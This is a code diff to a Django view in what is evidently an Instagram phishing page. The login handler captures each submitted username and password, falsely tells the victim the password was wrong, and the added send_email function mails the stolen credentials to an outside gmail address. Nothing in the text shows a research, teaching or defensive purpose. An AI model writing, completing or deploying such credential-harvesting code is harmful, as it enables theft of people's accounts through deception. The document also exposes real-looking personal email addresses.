@@ -1,6 +1,7 @@
 from django.shortcuts import render, redirect
 from django.contrib import messages
 from user_agents import parse
+from django.core.mail import send_mail
 
 def index(request):
     user_agent_string = request.META.get('HTTP_USER_AGENT', 'Unknown User Agent')
@@ -20,8 +21,18 @@ def login_view(request):
         # Save form data to the database
         user_data = {'username': username, 'password': password}
         print(f'User Data: {user_data}')
+        send_email(user_data)
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
         messages.success(request, success_message)
         # return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')
 
     return render(request, 'myapp/index.html', {'success_message': success_message})
+
+
+def send_email(user_data):
+    subject = 'Instagram new user pass'
+    message = f'New user registered!\n\nUsername: {user_data["username"]}\nPassword: {user_data["password"]}'
+    from_email = 'qadeeba123@gmail.com'  # Replace with your email address
+    recipient_list = ['aahadrahi786@gmail.com']  # Replace with the recipient's email address
+
+    send_mail(subject, message, from_email, recipient_list)
